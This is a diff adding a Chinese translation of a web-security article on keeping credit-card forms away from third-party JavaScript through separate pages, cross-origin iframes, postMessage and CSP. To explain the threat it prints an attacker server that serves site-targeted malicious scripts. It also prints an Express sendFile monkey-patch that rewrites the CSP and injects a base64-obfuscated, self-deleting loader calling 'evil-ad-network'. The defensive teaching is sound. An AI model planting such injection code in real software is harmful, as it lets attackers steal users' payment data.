+&lt;h3 id=&quot;簡短的版本&quot;&gt;&lt;strong&gt;簡短的版本&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;沒有必要嘗試和避免第三方代碼&lt;/li&gt;
+  &lt;li&gt;在收集或顯示敏感訊息時，請將此信息擷取到不包含第三方JavaScript的單獨HTML文件中&lt;/li&gt;
+  &lt;li&gt;在iframe中顯示此文件&lt;/li&gt;
+  &lt;li&gt;從另一個域上的靜態文件服務器上提供文件&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;您也可以考慮完全避免使用第三方登錄和使用第三方程式(插件)來收集和處理信用卡訊息等敏感數據。&lt;/p&gt;
+
+&lt;p&gt;我在這篇文章中提出的建議只適用於敏感訊息（密碼、信用卡號碼等）非常有限且可以被封鎖的網站。如果您在聊天應用程式、電子郵件客戶端或GUI數據庫上工作，那麼&lt;strong&gt;一切&lt;/strong&gt;都可能敏感，我無計可施。&lt;/p&gt;
+
+&lt;h3 id=&quot;十八倍的版本&quot;&gt;&lt;strong&gt;十八倍的版本&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;我認為居安思危是一個好的開始。&lt;/p&gt;
+
+&lt;p&gt;我建議您思考一下，OnePlus &lt;a href=&quot;https://forums.oneplus.net/threads/jan-19-update-an-update-on-credit-card-security.752415/&quot;&gt;最近宣布&lt;/a&gt;：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;…一個惡意的腳本被注入到支付頁面代碼中，以便在進入時嗅探信用卡信息…惡意腳本間歇性地操作，直接從用戶的瀏覽器捕獲和發送數據… oneplus.net上的多達4萬個用戶可能受到影響由事件&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;慘。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;現在讓我們把這種模糊的恐懼感變成更具體的東西吧。&lt;/p&gt;
+
+&lt;p&gt;也許給一個場景描述是更為有用的…&lt;/p&gt;
+
+&lt;p&gt;我們想像&lt;strong&gt;第三方代碼&lt;/strong&gt;是一個大杜賓。牠看起來很平靜 溫柔，均勻。但是在牠黑暗且毫無感情的眼睛裡，卻有著未知潛力的閃爍。讓我們只好慶幸我們沒有把我們喜愛的東西放在附近觸動牠。&lt;/p&gt;
+
+&lt;p&gt;現在我把我用戶的&lt;strong&gt;敏感訊息&lt;/strong&gt;描繪成一個可愛且毫無防備的倉鼠。我們看著牠天真地舔著牠的小前腳，梳理著牠那笨拙的小臉，在杜賓犬的尾巴處嬉鬧不已。&lt;/p&gt;
+
+&lt;p&gt;現在，如果你曾經與一個杜賓犬（我強烈推薦它）成為朋友，你可能知道他們是美好、溫柔的生物，並不與他們的惡名相稱。但是，我相信你肯定會同意不該放杜賓犬與一個和狗狗用的咀嚼玩具極其相似的倉鼠單獨相處。&lt;/p&gt;
+
+&lt;p&gt;當然，也許你會下班回家，看到動物方城市中和平相處的可愛場景。或者，也許你會回家會見證倉鼠曾經呼吸的空氣，與一隻像在說“我可以看到甜點菜單嗎？”而把頭朝下的狗&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;我不認為該把來自npm、GTM、DFP或任何其他地方的代碼貼上惡意標籤。但是我建議，除非你能保證這個代碼的行為良好，否則讓它經手你的用戶敏感訊息是對自己的不負責任。&lt;/p&gt;
+
+&lt;p&gt;所以…這是我建議我們都採用的心態：&lt;strong&gt;敏感訊息&lt;/strong&gt;和&lt;strong&gt;第三方代碼&lt;/strong&gt;應該隔離而不放在一起。&lt;/p&gt;
+
+&lt;h4 id=&quot;例如修復易受攻擊的網站&quot;&gt;&lt;strong&gt;例如：修復易受攻擊的網站&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;這個例子中的網站有一個常見的信用卡表格，它很容易受到惡意的第三方代碼的侵害，就像在那幾個非常大的電子商務網站上的那樣，你可能認為這些大網站的安全性更好。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*GgGOpt0c8n3tzkdddFJ2ew.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;好的，我知道，我的程式之路耽誤了我的設計天份。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ezxNzJl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以這個頁面&lt;strong&gt;充滿&lt;/strong&gt;了第三方代碼。它使用React，並且使用Create React App創建，所以在我開始做些甚麼之前它就先塞了我886 npm封包（認真）。&lt;/p&gt;
+
+&lt;p&gt;它也有Google Tag Manager（如果您不知道，GTM對於那些您從來沒有遇過的人來說是一個攻擊方便的方法，它可以在不妨礙代碼審查的情況下將JavaScript注入到您的網站中）。&lt;/p&gt;
+
+&lt;p&gt;為了讓這頁面更像樣，我還補了一個橫幅廣告（怒秀一波）。這是一個在網路上的廣告，所以自然需要1.5 MB的JavaScript來分出112個網路請求在11秒全面傾占CPU資源來加載一個反覆騎馬的信用卡gif動畫。&lt;/p&gt;
+
+&lt;p&gt;（場邊嘮叨：我對Google很失望，他們的開發者主張花費大量的時間教會我們如何快速地創建網頁，在這里和幾毫秒之內削減幾萬字節 - 這的確是很棒的東西。但他們允許他們的DFP廣告網路向用戶的設備發送&lt;strong&gt;幾兆字節&lt;/strong&gt;，發出&lt;strong&gt;數百個&lt;/strong&gt;網路請求，並在CPU上停留整整&lt;strong&gt;一秒&lt;/strong&gt;。Google，我知道您有有顆能想出提供更智能，更快速的廣告投放方式的腦袋，您為什麼不用呢？）&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;好的，回到這篇的主題……顯然，我需要做的是從所有&lt;strong&gt;第三方代碼&lt;/strong&gt;骯髒的手中區隔出用戶的&lt;strong&gt;敏感信息&lt;/strong&gt; ; 我們希望以這種形式活在自己的小島上。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/2000/1*bjTH5qkIW8kyu1qqXaIFQA.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第一步：為縮略圖找一張漂亮的照片。第二步：編寫一個涉及帖子主題和選擇縮略圖的陳腐隱喻&lt;/p&gt;
+
+&lt;p&gt;現在我們就像通過這篇文章的五分之二，我將開始實際描述一些方法。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;選項1：將信用卡表單移至其自己的文檔，不含第三方JavaScript，並將其作為單獨的頁面提供&lt;/li&gt;
+  &lt;li&gt;選項2：與選項1相同，但頁面在iframe中提供&lt;/li&gt;
+  &lt;li&gt;選項3：與選項2相同，但是父頁面和iframe通過相互通信 &lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;選項1為敏感數據分頁&quot;&gt;&lt;strong&gt;選項1：為敏感數據分頁&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;最簡單的事情就是創建一個沒有JavaScript的全新頁面。當用戶點擊“購買”時，我們會把它們轉送到下圖的新頁面視窗，而不是以一些平滑(為了某些美學、使用觀感的理由)的形式載入在當前頁面：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*5eUVNNY6lruo7pw4MxHqaw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不幸的是，因為我的網站的頁首，頁尾和導覽列都是React組件，所以我不能在這個非常陽春的頁面上使用它們。因此，您看到的“標題”是我完整標題的手動複製版，並沒有全部的常見功能。這只是一個藍色的矩形。&lt;/p&gt;
+
+&lt;p&gt;當用戶 填盡(in) 該表格（還是該說 填完(out) 該表單-為什麼對立的詞組出一樣的意思！？），他們會點擊提交，並重新轉址回到結賬流程的下一個步驟。這可能需要進行一些後端的修改，以比對用戶他們在跨頁面轉移時提交的數據。&lt;/p&gt;
+
+&lt;p&gt;為了保持這份文件的乾淨優秀，我們應使用native form validation
+，而不是JavaScript -  &lt;a href=&quot;https://caniuse.com/#feat=form-validation&quot;&gt;現有97％使用率&lt;/a&gt;，想只靠&lt;code class=&quot;highlighter-rouge&quot;&gt;required&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;pattern&lt;/code&gt;兩個屬性讓我們通過一個完整的JavaScript驗證應該還有很長的路要走。&lt;/p&gt;
+
+&lt;p&gt;如果你想看實際運用，&lt;a href=&quot;https://codepen.io/davidgilbertson/pen/OzdEbL&quot;&gt;這裡有一份筆記&lt;/a&gt;，裡面有一些no-js
+正規表達式驗證和條件樣本。（預設的限制不多，但應該足夠表達用法了。）&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;我建議，如果你要這樣做，最好把它全部保存在一個文件中。&lt;/p&gt;
+
+&lt;p&gt;複雜是這裡的敵人（比以往任何時候都多）。上面例子中的HTML文件（加上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;style&amp;gt;&lt;/code&gt;標籤中嵌入的CSS）約有100行; 由於它很小幾乎沒有網路請求，因此幾乎不可能受干擾而未被發現。&lt;/p&gt;
+
+&lt;p&gt;不幸的是，這種方法需要復制許多CSS。我已經想了很多，看了幾種方法。他們只想要更多的程式碼，而防止重複程式碼的數量不是他們的目標。&lt;/p&gt;
+
+&lt;p&gt;所以，我建議儘管“不要重複已存程式碼”的口號是很好的目標，但不應該被視為必須不惜一切代價持之以恆的絕對原則。在一些像本篇描述的罕見情況下，重複的程式碼是兩個惡果中較小的一個。&lt;/p&gt;
+
+&lt;p&gt;最有用的規則是你知道什麼時候該打破它。&lt;/p&gt;
+
+&lt;p&gt;（我的新年的決心是嘗試讓事情聽起來更深刻，但實際上沒有說出任何實質內容。）&lt;/p&gt;
+
+&lt;h4 id=&quot;選項2在iframe中重擊選項1&quot;&gt;&lt;strong&gt;選項2：在iframe中重擊選項1&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;選項1固然是好的，但是從UI和UX的角度來看，這明顯是一大退步，而是你想要讓別人付錢之旅程的最後一個摩擦地方。&lt;/p&gt;
+
+&lt;p&gt;選項2通過截取表單並塞進iframe中來提供服務以解決此問題。&lt;/p&gt;
+
+&lt;p&gt;你可能會試圖做下面這樣的事情：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe
+  src=&quot;/credit-card-form.html&quot;
+  title=&quot;credit card form&quot;
+  height=&quot;460&quot;
+  width=&quot;400&quot;
+  frameBorder=&quot;0&quot;
+  scrolling=&quot;no&quot;
+/&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;先別做傻事。&lt;/p&gt;
+
+&lt;p&gt;在這個例子中，父頁面和iframe的內容仍然可以自由地查看和交互。這就像把一個杜賓犬留在一個房間裡，而倉鼠在另一個房間裡，在他們之間有一扇門。但當杜賓犬變得飢餓的時候，牠可以簡單地推開。&lt;/p&gt;
+
+&lt;p&gt;所以我們需要做的是“沙箱”，即iframe。可是（我最近才知道）這與iframe 的&lt;code class=&quot;highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;屬性無關，因為這是用於保護iframe的父頁面。但我想從父頁面保護iframe的內容。&lt;/p&gt;
+
+&lt;p&gt;幸運的是，瀏覽器對來自不同來源的東西有著預設的不信任。這就是所謂的&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;同源政策&lt;/a&gt; [容在這裡怒政治上嘴一波川普]。&lt;/p&gt;
+
+&lt;p&gt;正因為如此，只需從不同的網域加載frame就足以防止兩者之間的通訊。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe
+  src=&quot;https://different.domain.com/credit-card-form.html&quot;
+  title=&quot;credit card form&quot;
+  height=&quot;460&quot;
+  width=&quot;400&quot;
+  frameBorder=&quot;0&quot;
+  scrolling=&quot;no&quot;
+/&amp;gt;
+如此就能實現動物方城市大和平共處了。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;如果你想知道iframe中內容的可訪問性，這是個好問題，但你不用擔心。&lt;a href=&quot;https://webaim.org/techniques/frames/&quot;&gt;根據WebAIM的說法&lt;/a&gt;：“內聯框架沒有明顯的可訪問性問題。內聯框架的內容是在它遇到的位置（基於標記順序）讀取的，就好像它是父頁面中的內容一樣。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;讓我們考慮填充表單後會發生什麼。用戶將在iframe中的表單中點擊提交按鈕，並且我想要轉址到&lt;strong&gt;父&lt;/strong&gt;頁面。但是，如果他們有不同的來源，這有可能嗎？&lt;/p&gt;
+
+&lt;p&gt;Yup，這就是&lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt;表單的屬性：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form
+  action=&quot;/pay-for-the-thing&quot;
+  method=&quot;post&quot;
+  target=&quot;_top&quot;
+&amp;gt;
+  &amp;lt;!-- form fields --&amp;gt;
+&amp;lt;/form&amp;gt;
+接下來他們還能怎樣？
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;因此，用戶可以將其敏感訊息輸入到與周圍頁面無縫接軌的表單中。然後當他們提交時，頂層頁面被轉址以回應表單提交。&lt;/p&gt;
+
+&lt;p&gt;選項2是對安全性的一個巨大增強 - 我不再有一個落後的信用卡填寫形式。但是這仍然在可用性上退步。&lt;/p&gt;
+
+&lt;p&gt;理想的解決方案將不需要&lt;strong&gt;任何&lt;/strong&gt;完整的頁面重定向&lt;/p&gt;
+
+&lt;h4 id=&quot;選項3在框架和父頁面之間進行通訊&quot;&gt;&lt;strong&gt;選項3：在框架和父頁面之間進行通訊&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;在我的示例網站中，我實際上希望保持信用卡數據的狀態，以及所購買產品的詳細訊息，並將所有訊息以一個AJAX的型式打包請求並提交。&lt;/p&gt;
+
+&lt;p&gt;這是非常容易的。我將使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;將數據從表單發送到父頁面。&lt;/p&gt;
+
+&lt;p&gt;這是在iframe中提供的頁面…&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;body&amp;gt;
+  &amp;lt;form id=&quot;form&quot;&amp;gt;
+    
+    &amp;lt;!-- form stuff in here --&amp;gt;
+    
+  &amp;lt;/form&amp;gt;
+
+  &amp;lt;script&amp;gt;
+    var form = document.getElementById('form');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      var payload = {
+        type: 'bananas',
+        formData: {
+          a: form.ccname.value,
+          b: form.cardnumber.value,
+          c: form.cvc.value,
+          d: form['cc-exp'].value,
+        },
+      };
+      window.parent.postMessage(payload, 'https://mysite.com');
+    });
+  &amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+還記得var嗎？
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;…以及在父頁面（或者更具體地說，在首先請求iframe的React組件）中，我只是偵聽來自iframe的訊息並相應地更新狀態：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class CreditCardFormWrapper extends PureComponent {
+  componentDidMount() {
+    window.addEventListener('message', ({ data }) =&amp;gt; {
+      if (data.type === 'bananas') {
+        this.setState(data.formData);
+      }
+    });
+  }
+
+  render() {
+    return (
+      &amp;lt;iframe
+        src=&quot;https://secure.mysite.com/credit-card-form.html&quot;
+        title=&quot;credit card form&quot;
+        height=&quot;460&quot;
+        width=&quot;400&quot;
+        frameBorder=&quot;0&quot;
+        scrolling=&quot;no&quot;
+      /&amp;gt;
+    );
+  }
+}
+這個舉例是針對React客製的，但這個概念不是
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;如果iframe覺得自己很活躍，那麼我可以將&lt;code class=&quot;highlighter-rouge&quot;&gt;onchange&lt;/code&gt;每個輸入的數據從表單發送到父項。&lt;/p&gt;
+
+&lt;p&gt;當iframe活躍時，沒有任何東西阻止父頁面進行驗證，並將有效性狀態發送回普通表格。這使我可以重用我的網站其他任何驗證邏輯。&lt;/p&gt;
+
+&lt;p&gt;[補充：根據在本篇評論中兩個&lt;a href=&quot;https://medium.com/@jimmybyrum/any-reason-not-to-do-form-validation-within-the-iframe-either-with-some-very-trustworthy-js-or-a1e7695f82b1&quot;&gt;留言者&lt;/a&gt;的建議，iFrame可以提交數據，而不轉址至父頁面，然後通訊成功/失敗的狀態使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;返還給父頁面。這樣就沒有數據被發送到父頁面。]&lt;/p&gt;
+
+&lt;p&gt;就是這樣了！您的用戶敏感訊息可以安全地輸入到不同來源的iframe中，而不會被父頁面隱藏，但是獲取的數據仍然可以是應用程序狀態的一部分，這意味著用戶體驗不需要進行任何更改。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;現在，您可能會認為將信用卡數據上傳到主頁面是巨大的失敗。這不是可供任何惡意代碼訪問嗎？&lt;/p&gt;
+
+&lt;p&gt;這個答案有兩個部分，我想不出一個簡單的方法來解釋它。抱歉。&lt;/p&gt;
+
+&lt;p&gt;我認為這是一個合理的風險，從駭客的角度來看更容易理解。想像一下，你的工作是想出一些可以在&lt;strong&gt;任何&lt;/strong&gt;網站上運行的惡意代碼，尋找敏感訊息並將其發送到某個伺服器。每次你發送封包時，都會冒著被抓的危險。所以只發送你確定有價值的數據是最符合你的效益的。&lt;/p&gt;
+
+&lt;p&gt;如果這是我的工作，我不會盲目傾聽&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;事件並發送我在其中發現的數據。尤其不是當有千千萬萬個網站正有完全脆弱的信用卡表單與整齊地標記輸入時候。&lt;/p&gt;
+
+&lt;p&gt;答案的第二部分是，如果您擔心的惡意代碼&lt;strong&gt;不&lt;/strong&gt;只是一些通用代碼，它可能&lt;strong&gt;知道&lt;/strong&gt;要在您的網站上收聽該&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;事件，並將信用卡號碼取出。這種完全針對您的網站專門編寫代碼的想法，它值得…&lt;/p&gt;
+
+&lt;h3 id=&quot;目標和通用的惡意代碼&quot;&gt;&lt;strong&gt;目標和通用的惡意代碼&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;到目前為止我已經描述了使用&lt;strong&gt;通用&lt;/strong&gt;惡意代碼的攻擊 也就是說，代碼不知道它運行的是什麼網站，它只是尋找，收集和發送敏感訊息給惡龍在火山地下室的邪惡巢穴。&lt;/p&gt;
+
+&lt;p&gt;另一方面，&lt;strong&gt;有針對性的&lt;/strong&gt;惡意代碼是與&lt;strong&gt;您的&lt;/strong&gt;網站專門針對而寫的代碼。它是由一個熟練的開發人員花了幾個星期完全熟悉你的DOM的每一個角落而成的結晶。&lt;/p&gt;
+
+&lt;p&gt;如果您的網站受到了有&lt;strong&gt;針對性的&lt;/strong&gt;惡意代碼的攻擊，那就爆了。這情況沒有第二種可能。一定是你已經把所有東西都放在一個非常安全的iframe中，但是惡意代碼只會刪除iframe並用假表單替換它。攻擊者甚至可以更改網站上顯示的價格，可能會提供50％的折扣，並告訴用戶如果他們需要貨物，他們需要重新輸入信用卡詳細信息。爆成這樣的這種苦果是你應得的。&lt;/p&gt;
+
+&lt;p&gt;如果您的網站上有針對性的惡意代碼，那麼您最好還是彎下腰來撿一朵鮮花，然後聞一聞然後放鬆。你知道，我們應該專注於生活中的正面積極的東西。&lt;/p&gt;
+
+&lt;p&gt;這就是為什麼擁有&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;內容安全策略&lt;/a&gt;非常重要。否則，攻擊者可以通過向邪惡的伺服器發送請求來大規模散布可升級到&lt;strong&gt;有針對性的&lt;/strong&gt;代碼的&lt;strong&gt;通用&lt;/strong&gt;惡意代碼（比如通過一個npm包）。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app.get('/analytics.js', (req, res) =&amp;gt; {
+  if (req.get('host').includes('acme-sneakers.com')) {
+    res.sendFile(path.join(__dirname, '../malicious-code/targeted/acme-sneakers.js'));
+  } else if (req.get('host').includes('corporate-bank.com')) {
+    res.sendFile(path.join(__dirname, '../malicious-code/targeted/corporate-bank.js'));
+  } else if (req.get('host').includes('government-secrets.com')) {
+    res.sendFile(path.join(__dirname, '../malicious-code/targeted/government-secrets.js'));
+  } else if (req.get('host').includes('that-chat-app.com')) {
+    res.sendFile(path.join(__dirname, '../malicious-code/targeted/that-chat-app.js'));
+  } else {
+    res.sendFile(path.join(__dirname, '../malicious-code/generic.js'));
+  }
+});
+在攻擊者的伺服器上
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;攻擊者可以自由更新並在閒暇時添加他們的針對性代碼。&lt;/p&gt;
+
+&lt;p&gt;你真的&lt;strong&gt;必須&lt;/strong&gt;建好自己的CSP。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;好吧，這是很粗糙的說法：使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;發送敏感數據從一個iframe到父頁面只會稍微增加您的風險。&lt;strong&gt;通用&lt;/strong&gt;惡意代碼顯然不太可能會截到這一點。而無論您做什麼，&lt;strong&gt;有針對性&lt;/strong&gt;的代碼都會獲取用戶的信用卡數據。&lt;/p&gt;
+
+&lt;p&gt;（根據記錄，我不會在自己的小網站上使用選項1,2或3，我會讓專業人員處理我的信用卡數據，只提供Google / Facebook / Twitter登錄。你當然可以不要遵循這個建議，如果你的用戶不會註冊社交網站的成本大過你必須安全地獲取和存儲密碼的成本/風險。&lt;/p&gt;
+
+&lt;h3 id=&quot;其他點的脆弱性&quot;&gt;&lt;strong&gt;其他點的脆弱性&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;你可能會認為，只要你按照上面的建議做，你就會是安全健康的。其實不然。我想到還有四個地方可能會遇到麻煩，我發誓要用社群的智慧來保持下面這些更新。&lt;/p&gt;
+
+&lt;h4 id=&quot;1在伺服器上&quot;&gt;&lt;strong&gt;1.在伺服器上&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;我現在有一個超輕量級的HTML文件，準備用來擷取用戶的輸入而不被偷取。我只需要把它放置在某個地方，以便它可以從一個單獨的網域中提供服務。&lt;/p&gt;
+
+&lt;p&gt;也許我會在某處啟動一個簡單的Node伺服器。我只是添加&lt;strong&gt;一個&lt;/strong&gt;小log包…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*rGWHJtLE1KnGLfYJMVP3Wg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;哦，來吧。204包是吧？&lt;/p&gt;
+
+&lt;p&gt;好的，204是很多，但是你可能想知道在只服務於文件的伺服器上運行的程式碼是如何危害到在瀏覽器中所輸入的用戶數據的？&lt;/p&gt;
+
+&lt;p&gt;那麼，問題就是任何npm包中的任何程式碼都可以在你的伺服器上執行，包括處理網路流量的程式碼。&lt;/p&gt;
+
+&lt;p&gt;現在，我只是一個惡意開發者，我很容易被四個字母的單詞混淆像&lt;code class=&quot;highlighter-rouge&quot;&gt;this&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;，但即使我可以完成將一個腳本注入outbound response，並允許它透過編輯CSP來訪問我的邪惡網域。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const fs = require('fs');
+const express = require('express');
+
+let indexHtml;
+const originalResponseSendFile = express.response.sendFile;
+
+express.response.sendFile = function(path, options, callback) {
+  if (path.endsWith('index.html')) {
+    // add my domain to the content security policy
+    let csp = express.response.get.call(this, 'Content-Security-Policy') || '';
+    csp = csp.replace('connect-src ', 'connect-src https://adxs-network-live.com ');
+
+    express.response.set.call(this, 'Content-Security-Policy', csp);
+
+    // inject a cheeky little self-destructing script
+    if (!indexHtml) {
+      indexHtml = fs.readFileSync(path, 'utf8');
+
+      const script = `
+        &amp;lt;script&amp;gt;
+          var googleAuthToken = document.createElement('script');
+          googleAuthToken.textContent = atob('CiAgICAgICAgY29uc3Qgc2NyaXB0RWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBzY3JpcHRFbC5zcmMgPSAnaHR0cHM6Ly9ldmlsLWFkLW5ldHdvcms/YWRfdHlwZT1tZWRpdW0nOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgICAgIHNjcmlwdEVsLnJlbW92ZSgpOyAvLyByZW1vdmUgdGhlIHNjcmlwdCB0aGF0IGZldGNoZXMKICAgICAgICBkb2N1bWVudC5zY3JpcHRzW2RvY3VtZW50LnNjcmlwdHMubGVuZ3RoIC0gMV0ucmVtb3ZlKCk7IC8vIHJlbW92ZSB0aGlzIHNjcmlwdAogICAgICAgIGRvY3VtZW50LnNjcmlwdHNbZG9jdW1lbnQuc2NyaXB0cy5sZW5ndGggLSAxXS5yZW1vdmUoKTsgLy8gYW5kIHRoZSBvbmUgdGhhdCBjcmVhdGVkIGl0CiAgICA=');
+          document.body.appendChild(googleAuthToken);
+        &amp;lt;/script&amp;gt;
+      `;
+
+      indexHtml = indexHtml.replace('&amp;lt;/body&amp;gt;', `${script}&amp;lt;/body&amp;gt;`);
+    }
+
+    express.response.send.call(this, indexHtml);
+  } else {
+    originalResponseSendFile.call(this, path, options, callback);
+  }
+};
+什麼是紅色，鯡魚和一個名為“googleAuthToken”的變量？
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;當注入的腳本登陸瀏覽器時，它會從邪惡的伺服器加載一些（可能是有針對性的）惡意的JavaScript（這可能是因為CSP認為這是可以的），然後刪除它自己的所有痕跡。&lt;/p&gt;
+
+&lt;p&gt;上面的要點本身並沒有實際的用處（正如眼睛銳利的讀者都會注意到的那樣），一個真正的駭客不可能會像這樣直白的攻擊。我只是想說明你的伺服務器就是個狂野西部無法地帶，那裡的&lt;strong&gt;任何東西&lt;/strong&gt;都有可能暴露用戶在瀏覽器中輸入的數據。&lt;/p&gt;
+
+&lt;p&gt;（如果你是一個package的作者，你可以考慮使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Object.freeze&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;Object.defineProperty&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;writable: false&lt;/code&gt;來鎖定你的東西。）&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;實際上，可能有點牽強附會，認為有Node模塊明目張膽的做outbound requests確實太扯了 - 對我來說這也太容易被發現了。&lt;/p&gt;
+
+&lt;p&gt;但是，你是否真的想要創建一個不包含任何第三方代碼的表單，但讓第三方代碼能夠在將其發送給用戶之前進行修改？這是屬於你該考量的。&lt;/p&gt;
+
+&lt;p&gt;我的建議是從靜態文件伺服器提供這些“安全”的文件，或不要打斷來做任何這樣的事情。&lt;/p&gt;
+
+&lt;h4 id=&quot;2發送到靜態文件服務器&quot;&gt;&lt;strong&gt;2.發送到靜態文件服務器&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;是的，標題即是我們要更進的一步，但也同時是一個漏洞的名稱。&lt;/p&gt;
+
+&lt;p&gt;我是&lt;a href=&quot;https://firebase.google.com/docs/hosting/&quot;&gt;Firebase for static hosting&lt;/a&gt;的忠實粉絲，因為它的速度可以極盡所能的快，而且部署簡單的要命。&lt;/p&gt;
+
+&lt;p&gt;只需安裝&lt;code class=&quot;highlighter-rouge&quot;&gt;firebase-tools&lt;/code&gt;從NPM和…哦不，我正在使用NPM來避免使用NPM。&lt;/p&gt;
+
+&lt;p&gt;好吧，深呼吸一下，也許這是那些美麗的zero-dependency
+NPM之一。&lt;/p&gt;
+
+&lt;p&gt;正在安裝…安裝…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*otIgVW16N9SkaHhOAoX_JA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;耶穌在上，640包！&lt;/p&gt;
+
+&lt;p&gt;好，我放棄提出建議了，你現在只能靠自己惹。只是把你的HTML文件以某種方式放到伺服器上。在某個時候，我們都需要信任由陌生人寫的程式碼。&lt;/p&gt;
+
